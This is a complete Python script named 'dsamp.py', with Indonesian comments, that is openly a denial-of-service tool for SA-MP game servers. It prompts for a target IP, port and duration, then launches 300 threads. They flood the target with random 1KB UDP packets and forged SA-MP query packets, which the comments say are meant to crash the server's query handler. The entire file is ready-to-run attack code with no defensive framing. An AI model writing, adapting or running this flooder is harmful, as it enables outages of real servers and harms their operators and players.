# dsamp.py - SA-MP UDP Flooder (High Packet Rate)
# Usage: python dsamp.py
# Input: IP → Port → Duration (seconds)

import socket
import threading
import time
import random
import sys
import os

# Warna terminal (opsional, biar keliatan lebih kece)
os.system('')  # Windows ANSI support
GREEN = '\033[92m'
RED   = '\033[91m'
RESET = '\033[0m'

def udp_flood(ip, port, duration, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)  # paket acak 1KB

    # Beberapa payload SA-MP query palsu (lebih efektif crash query handler)
    samp_queries = [
        b'SAMP' + bytes([random.randint(0,255) for _ in range(10)]),  # fake query
        b'i' + b'\x00'*10,                                             # info query
        b'r' + b'\x00'*10,                                             # rules
        b'c' + b'\x00'*10,                                             # clients
        b'd' + b'\x00'*10,                                             # detailed players
        b'p' + b'\x00'*10                                              # ping
    ]

    end_time = time.time() + duration

    sent = 0
    while time.time() < end_time:
        try:
            # Kirim payload acak + kadang query SA-MP
            if random.random() > 0.7:
                payload = random.choice(samp_queries)
            else:
                payload = bytes_to_send

            sock.sendto(payload, (ip, port))
            sent += 1

            if sent % 500 == 0:
                print(f"{GREEN}[Thread {thread_id}]{RESET} Sent {sent:,} packets", end='\r')

        except:
            pass  # ignore error socket

    print(f"{GREEN}[Thread {thread_id}]{RESET} Finished - {sent:,} packets sent")

def main():
    print(f"{RED}DSAMP FLOODER - SA-MP UDP Attack{RESET}")
    print("------------------------------------")

    target_ip   = input(f"{GREEN}Target IP: {RESET}")
    try:
        target_port = int(input(f"{GREEN}Port (default 7777): {RESET}") or 7777)
    except:
        target_port = 7777

    try:
        duration = int(input(f"{GREEN}Duration (seconds): {RESET}"))
    except:
        duration = 60
        print(f"Default duration set to {duration} seconds")

    thread_count = 300  # ubah sesuai kemampuan PC (100-1000)

    print(f"\n{RED}Starting attack on {target_ip}:{target_port} for {duration}s with {thread_count} threads...{RESET}")
    print("Press Ctrl+C to stop manually\n")

    threads = []

    for i in range(thread_count):
        t = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, i+1))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        time.sleep(duration + 2)
    except KeyboardInterrupt:
        print(f"\n{RED}Attack stopped by user{RESET}")
        sys.exit(0)

    print(f"\n{GREEN}Attack selesai.{RESET}")

if __name__ == "__main__":
    main()
